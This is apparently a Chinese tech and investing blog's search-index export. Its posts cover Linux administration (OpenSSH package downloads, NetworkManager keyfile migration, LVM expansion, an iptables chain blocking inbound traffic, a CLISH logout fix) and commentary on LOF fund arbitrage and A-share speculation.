<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y yum-utils</span><br><span class="line">dnf config-manager --enable security-common</span><br><span class="line">yumdownloader --downloadonly --downloaddir=./ openssh-8.7p1-38.1.el9_4.security.0.7.x86_64</span><br><span class="line">yumdownloader --downloadonly --downloaddir=./ openssh-server-8.7p1-38.1.el9_4.security.0.7.x86_64</span><br><span class="line">yumdownloader --downloadonly --downloaddir=./ openssh-clients-8.7p1-38.1.el9_4.security.0.7.x86_64</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>从Centos7升级到Rocky linux 9后，网卡连接显示Wired connection 1问题定位</title>
    <url>/2024/07/12/2024-07-12-nic-con-show-wired-connection-one-after-upgrade-from-centos7-to-rocky9/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>从Centos7升级到Rocky9后, 发现网卡eth0的IP不正确。通过<code>nmcli</code>查看网卡连接，找不到name为eth0的连接，只显示’Wired connection 1’</p>
<span id="more"></span>

<p><img src="/2024/07/12/2024-07-12-nic-con-show-wired-connection-one-after-upgrade-from-centos7-to-rocky9/image1.png"><br>查看<code>/etc/NetworkManager/system-connections/</code>，发现找不到网卡配置文件。</p>
<h2 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h2><p>centos7使用的网卡配置文件是ifcfg-files(<code>/etc/sysconfig/network-scripts/ifcfg-XXX</code>)，而RHEL9使用的是keyfiles(<code>/etc/NetworkManager/system-connections/XXX.nmconnection</code>)。<br>升级到Rocky 9后，需要把eth0网卡重新配置一下。</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>使用nmcli，先删除’Wired connection 1’这个连接，再为eth0网卡生成新的连接，方法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 删除 Wired connection 1 连接</span><br><span class="line">nmcli dev disconnect eth0</span><br><span class="line">nmcli con del c04f10b8-8831-3d68-9b79-2ac22907357c # nmcli con show 查找`Wired connection 1`连接的uuid，根据uuid删除连接</span><br><span class="line">ip -4 route flush dev eth0</span><br><span class="line"></span><br><span class="line"># 重新生成eth0连接 (这里设置static IP 10.206.216.91，网关10.206.216.254, dns 8.8.8.8)</span><br><span class="line">nmcli con add con-name eth0 autoconnect yes  type ethernet ifname eth0 ipv4.method manual ip4 &quot;10.206.216.91/24&quot; gw4 &quot;10.206.216.254&quot;  ipv4.dns &quot;8.8.8.8&quot;</span><br><span class="line">nmcli c up eth0</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.redhat.com/en/blog/rhel-9-networking-say-goodbye-ifcfg-files-and-hello-keyfiles">https://www.redhat.com/en/blog/rhel-9-networking-say-goodbye-ifcfg-files-and-hello-keyfiles</a></p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>troubleshooting</tag>
      </tags>
  </entry>
  <entry>
    <title>标普印度基金关门，继续套利美元债LOF</title>
    <url>/2024/07/14/2024-07-14-india-fund-close-and-arbitrage-usd-bond-lof/</url>
    <content><![CDATA[<p>7月8号印度基金(164824)宣布暂停申购，7月11号标普信息科技(161128)也宣布关门。</p>
<p>我算了一下这次的套利收益，每天都参与的情况下，单个账户收益达到1800+，10个账户就是1万8。</p>
<p>再加上之前参与的全球芯片(501225), 标普500(161225), 黄金LOF(161116)，今年上半年每个账户的收益接近3000元。一家人几个账户每天参与几分钟，一万多零花钱就到手了，简直白捡钱！</p>
<span id="more"></span>

<p>随着印度和标普宣告关门，现在仅剩下美元债LOF(501300)可以稳稳套利。这只基金我之前提到过，每个账户只能场外申购100元，再转托管卖出，目前的溢价是8%，一个账户每天可以赚8块。</p>
<p><strong>以华BAO为例，说下美元债LOF套利的操作步骤：</strong></p>
<ul>
<li><p>T日，在场外申购100元，操作流程：交易 -&gt; 开放式基金 -&gt; 基金申购 -&gt; 输入代码501300，购买金额100元, 确认。</p>
</li>
<li><p>T+3日，可以查到场外申购的份额到账。做转托管操作，操作流程：交易 - 开放式基金 - 美元债LOF - 转托管</p>
</li>
<li><p>T+5日，你可以查到转托管份额到达了场内，直接卖出即可。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>套利往事</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>川大智胜果然开盘涨停，这就是A股的尿性！</title>
    <url>/2024/07/15/2024-07-15-this-is-the-urinary-nature-of-MIAN-A/</url>
    <content><![CDATA[<p>昨天特朗普被刺杀未遂，提前赢得了大选。今天A股的川大智胜(002253)开盘即涨停，毫无悬念。</p>
<span id="more"></span>

<p><img src="/2024/07/15/2024-07-15-this-is-the-urinary-nature-of-MIAN-A/image1.png"><br>不要觉得奇怪，这就是缅A一直以来的尿性！什么炒龙凤，炒麻将，炒数字，炒AI，炒美国大选，炒娱乐明星，市场资金总能在这个粪坑里不断炒出新的玄学概念，无厘头炒作堪称一绝。</p>
<p>这就是A股，一个散户交易量占主导地位的市场。大量的散户在股市里快进快出，玩击鼓传花的游戏，导致股价经常出现背离基本面的剧烈波动。有句话说得好，傻X们的共识也是共识！</p>
<p>一天抓一个涨停板，对韭菜来说，诱惑力确实相当大，但是作为普通人，还是不要妄想自己拥有这种神奇的能力。而是要关注基本面和长期价值，不被市场概念炒作左右，避免被割韭菜。</p>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux LVM扩容方法实践</title>
    <url>/2024/07/17/2024-07-17-how-to-extend-lvm-storage/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>VMware Centos环境，根分区为LVM，大小50G，现在需要对根分区扩容。我添加了一块500G的虚拟硬盘(<code>/dev/sdb</code>)，如何把这500G扩容到根分区？</p>
<span id="more"></span>
<p><img src="/2024/07/17/2024-07-17-how-to-extend-lvm-storage/image1.png"></p>
<h2 id="LVM扩容方法"><a href="#LVM扩容方法" class="headerlink" title="LVM扩容方法"></a>LVM扩容方法</h2><h3 id="1-对新磁盘分区"><a href="#1-对新磁盘分区" class="headerlink" title="1. 对新磁盘分区"></a>1. 对新磁盘分区</h3><p>使用<code>fdisk /dev/sdb</code>命令，进行交互式分区操作。依次输入n (new一个分区), 输入p (创建primary分区)，输入Partition number(分区编号)为1，其余选项敲回车默认，最后敲w，创建出一个新分区。<br><img src="/2024/07/17/2024-07-17-how-to-extend-lvm-storage/image2.png"><br>通过<code>fdisk -l /dev/sdb</code> 查看新分区已成功创建<br><img src="/2024/07/17/2024-07-17-how-to-extend-lvm-storage/image3.png"></p>
<h3 id="2-格式化新分区"><a href="#2-格式化新分区" class="headerlink" title="2. 格式化新分区"></a>2. 格式化新分区</h3><p>先确认根分区的文件格式，先通过<code>lsblk | grep -w /</code>查到根分区的逻辑卷为<code>centos-root</code>，再通过<code>blkid</code>命令得到根分区的文件格式为<code>xfs</code><br><img src="/2024/07/17/2024-07-17-how-to-extend-lvm-storage/image4.png"><br>再使用<code>mkfs -t xfs /dev/sdb1</code>命令格式化新分区。（如果你的分区是<code>ext4</code>格式，就用<code>mkfs -t ext4 /dev/sdb1</code>）<br><img src="/2024/07/17/2024-07-17-how-to-extend-lvm-storage/image5.png"></p>
<h3 id="3-创建物理卷"><a href="#3-创建物理卷" class="headerlink" title="3. 创建物理卷"></a>3. 创建物理卷</h3><p>使用<code>pvcreate /dev/sdb1</code>命令创建物理卷<br><img src="/2024/07/17/2024-07-17-how-to-extend-lvm-storage/image6.png"></p>
<h3 id="4-扩展逻辑卷组"><a href="#4-扩展逻辑卷组" class="headerlink" title="4. 扩展逻辑卷组"></a>4. 扩展逻辑卷组</h3><p>使用<code>vgs</code>命令查询逻辑卷组(VG)的名称为<code>centos</code>，再使用<code>vgextend centos /dev/sdb1</code>命令扩展逻辑卷组<br><img src="/2024/07/17/2024-07-17-how-to-extend-lvm-storage/image7.png"><br><code>vgextend</code>执行后，可以看出逻辑卷组大小从511g变成1010.99g，说明扩展成功</p>
<h3 id="5-扩展逻辑卷"><a href="#5-扩展逻辑卷" class="headerlink" title="5. 扩展逻辑卷"></a>5. 扩展逻辑卷</h3><p>使用<code>lvextend -l +100%FREE /dev/mapper/centos-root</code>命令，将所有空间扩容到逻辑卷<code>centos-root</code><br><img src="/2024/07/17/2024-07-17-how-to-extend-lvm-storage/image8.png"></p>
<h3 id="6-调整文件系统大小"><a href="#6-调整文件系统大小" class="headerlink" title="6. 调整文件系统大小"></a>6. 调整文件系统大小</h3><p>对于<code>xfs</code>文件系统，使用<code>xfs_growfs /dev/mapper/centos-root</code>命令调整文件系统大小<br><img src="/2024/07/17/2024-07-17-how-to-extend-lvm-storage/image9.png"></p>
<p>最后查看效果，敲 <code>df -h </code>，发现根分区大小从50G变成550G，扩容成功！<br><img src="/2024/07/17/2024-07-17-how-to-extend-lvm-storage/image10.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/shoufeng/p/10615452.html">Linux - 通过LVM对磁盘进行动态扩容
</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>自定义iptables链，阻止所有进入流量的方法</title>
    <url>/2024/07/23/2024-07-23-block-imcoming-traffic-by-iptables/</url>
    <content><![CDATA[<h2 id="需求描述"><a href="#需求描述" class="headerlink" title="需求描述"></a>需求描述</h2><p>客户的Linux主机出现网络安全事件时, 需要先帮客户止血，再分析定位。</p>
<p>打开止血功能后，需要阻止所有进入流量(22号端口除外，系统内部流量和出去流量不受影响)；关闭止血功能后，解除限制，且原有的iptables规则要保持不变，如何实现？</p>
<h2 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h2><h3 id="阻止所有进入流量的方法-22号端口除外"><a href="#阻止所有进入流量的方法-22号端口除外" class="headerlink" title="阻止所有进入流量的方法(22号端口除外)"></a>阻止所有进入流量的方法(22号端口除外)</h3><ol>
<li>先自定义一个链BLOCK_IN, 新增规则: 22号端口ACCEPT, 其余端口DROP, 如下：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -N BLOCK_IN 							 <span class="comment"># 创建一个自定义链，名字是BLOCK_IN</span></span><br><span class="line">iptables -A BLOCK_IN -p tcp --dport 22 -j ACCEPT <span class="comment"># 允许22号端口通过</span></span><br><span class="line">iptables -A BLOCK_IN -j DROP 					 <span class="comment"># 丢弃</span></span><br></pre></td></tr></table></figure></li>
</ol>
<span id="more"></span>

<ol start="2">
<li>再从INPUT链的首部新增一条规则：从网卡eth0进来的流量跳转到自定义链BLOCK_IN（注意这里把eth0替换成你机器的网卡名），如下:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -I INPUT -i eth0 -j BLOCK_IN</span><br></pre></td></tr></table></figure>
在另一台机器上测试端口，发现超时，再测试SSH可以连接成功，说明修改生效。 使用<code>iptables -L BLOCK_IN -v -x</code>查看接收和丢弃的流量计数。</li>
</ol>
<h3 id="解除限制，放开进入流量"><a href="#解除限制，放开进入流量" class="headerlink" title="解除限制，放开进入流量"></a>解除限制，放开进入流量</h3><p>只需删除这个自定义链即可，原有的规则不受影响。方法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -D INPUT -i eth0 -j BLOCK_IN	<span class="comment"># 删除之前创建的规则，这一步不做后面删除链的时候会失败</span></span><br><span class="line">iptables -F BLOCK_IN 					<span class="comment"># 清空BLOCK_IN链的规则</span></span><br><span class="line">iptables -X BLOCK_IN 					<span class="comment"># 删除整个BLOCK_IN链</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>iptables</category>
      </categories>
      <tags>
        <tag>iptables</tag>
      </tags>
  </entry>
  <entry>
    <title>可转债违约是实体经济高质量发展的一大步？</title>
    <url>/2024/08/18/2024-08-18-is-bond-default-a-big-step-for-high-quality-development-of-economy/</url>
    <content><![CDATA[<p>8月14日，岭南股份公告其发行的可转债无法按期兑付，出现实质违约。8月16日，证券时报发表了一篇“雄文”《国企可转债的刚兑信仰该放下了》，引爆了舆论。</p>
<span id="more"></span>

<p><img src="/2024/08/18/2024-08-18-is-bond-default-a-big-step-for-high-quality-development-of-economy/image1.png"></p>
<p>文章内容总结下，就是对投资者一顿批评教育，批评投资者惰性思维，执迷于国资背景的刚性兑付。结尾直接称转债违约是可转债市场的一小步，经济高质量发展的一大步，TM脸都不要了。</p>
<p>诚然，作为投资者，需要考察企业的财务状况和偿债能力，打破”下有保底上不封顶”的思维惯性。但是作为一家权威的证券媒体，搞丧事喜办，公然对违约行为唱赞歌，去鼓励上市公司逃废债，这样的行为缺乏对投资者基本的尊重，简直是令人作呕。</p>
<p>原文百度搜不到了，我找了个截图，大家感受下这篇文章什么水平。</p>
<p><img src="/2024/08/18/2024-08-18-is-bond-default-a-big-step-for-high-quality-development-of-economy/image2.png"></p>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>CLISH logout后没有执行自定义脚本问题的解决方法</title>
    <url>/2024/08/19/2024-08-19-clish-custom-script-not-executed-after-logout/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>我有一个On-Premises Appliance使用了<a href="https://clish.sourceforge.net/">CLISH</a>(思科命令行)，需要对logout操作记录auditlog。我在配置文件root-view.xml里添加了自定义脚本记录auditlog，但是脚本没有执行，auditlog没有记录。</p>
<h2 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h2><p>Google没查到类似案例，毕竟这年头互联网公司谁还用这种命令行呢，只好把CLISH源代码下一份，捋下流程看看解决方法,  先给出我的root-view.xml配置：</p>
<span id="more"></span>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">COMMAND</span> <span class="attr">name</span>=<span class="string">&quot;logout&quot;</span> <span class="attr">help</span>=<span class="string">&quot;Logout of the current CLI session&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">ACTION</span> <span class="attr">builtin</span>=<span class="string">&quot;clish_close&quot;</span>&gt;</span>	<span class="comment">&lt;!-- 内置的clish_close方法，用于退出clish --&gt;</span></span><br><span class="line">	/usr/share/clish/scripts/basecmd.sh release #自定义的脚本，用于记录auditlog</span><br><span class="line">       <span class="tag">&lt;/<span class="name">ACTION</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">COMMAND</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>查看CLISH源码，看下root-view.xml中的command怎么解析的：</p>
<!-- more -->
<p><img src="/2024/08/19/2024-08-19-clish-custom-script-not-executed-after-logout/image1.png"></p>
<p>观察if语句发现问题所在：如果builtin存在，就不执行script。 我在配置文件里指定了builtin函数clish_close, 所以自定义的脚本没有执行。</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>我想到两种方法：<br><strong>方法1：</strong>自行修改CLISH源码, 改C函数clish_close, 添加自定义代码。 这种方法需要自己维护源代码，不太推荐。</p>
<p><strong>方法2:</strong> 在root-view.xml里自定义action, 通过kill $PPID(直接杀死父进程)的方式退出CLISH。</p>
<p>这种方法不需修改源代码，问题是每次退出会打印一行”Terminated”，无伤大雅。 将root-view.xml配置修改如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">COMMAND</span> <span class="attr">name</span>=<span class="string">&quot;logout&quot;</span> <span class="attr">help</span>=<span class="string">&quot;Logout of the current CLI session&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">ACTION</span>&gt;</span>	<span class="comment">&lt;!-- 去掉内置的clish_close方法 --&gt;</span></span><br><span class="line">	/usr/share/clish/scripts/basecmd.sh release</span><br><span class="line">	kill $PPID # 杀掉父进程，也就是CLISH主进程</span><br><span class="line">       <span class="tag">&lt;/<span class="name">ACTION</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">COMMAND</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="CLISH进程模型分析"><a href="#CLISH进程模型分析" class="headerlink" title="CLISH进程模型分析"></a>CLISH进程模型分析</h2><ul>
<li>一个主进程clish, 创建一个副线程循环读取用户输入的指令，主进程等待副线程退出;</li>
<li>副线程每读取一个指令就创建一个子进程，子进程执行xml里定义的builtin和action，执行完子进程退出。</li>
</ul>
<p>分析过程如下，通过GDB和ps命令，没啥难度：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux</span><br><span class="line"> 339658 ?        Ss     0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups</span><br><span class="line"> 339765 pts/0    Ss     0:00  |       \_ -bash</span><br><span class="line"> 383959 pts/0    Sl+    0:00  |           \_ clish (有两个线程, 副线程(383960)负责读取输入指令，主线程等待副线程(383960)结束</span><br><span class="line"> 384002 pts/0    S+     0:00  |               \_ sh -c  ??        /usr/share/clish/scripts/basecmd.sh release ??        <span class="built_in">echo</span> <span class="string">&quot;pid: $$, ppid: <span class="variable">$PPID</span>&quot;</span> ?? (执行用户自定义action的进程)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ps -T 383959 <span class="comment"># (CLISH进程有两个线程)</span></span><br><span class="line">    PID    SPID TTY      STAT   TIME COMMAND</span><br><span class="line"> 383959  383959 pts/0    Sl+    0:00 clish (创建副线程383960，等待其退出)</span><br><span class="line"> 383959  383960 pts/0    Sl+    0:00 clish (副线程循环读取用户输入指令, 创建子进程执行自定义<span class="built_in">builtin</span>和action)</span><br><span class="line"></span><br><span class="line">ps ajx | grep clish <span class="comment"># (查看相关CLISH进程的PID, 父进程ID, 线程ID)</span></span><br><span class="line">   PPID     PID    PGID     SID TTY        TPGID STAT   UID   TIME COMMAND</span><br><span class="line"> 339765  383959  383959  339765 pts/0     383959 Sl+      0   0:00 clish</span><br><span class="line"> 383959  384002  383959  339765 pts/0     383959 S+       0   0:00 sh -c  ??   /usr/share/clish/scripts/basecmd.sh release ??        <span class="built_in">echo</span> <span class="string">&quot;pid: $$, ppid: <span class="variable">$PPID</span>&quot;</span> ??        <span class="built_in">sleep</span> 1000 ??        <span class="built_in">kill</span> <span class="variable">$PPID</span> ???</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>CLISH</tag>
      </tags>
  </entry>
</search>
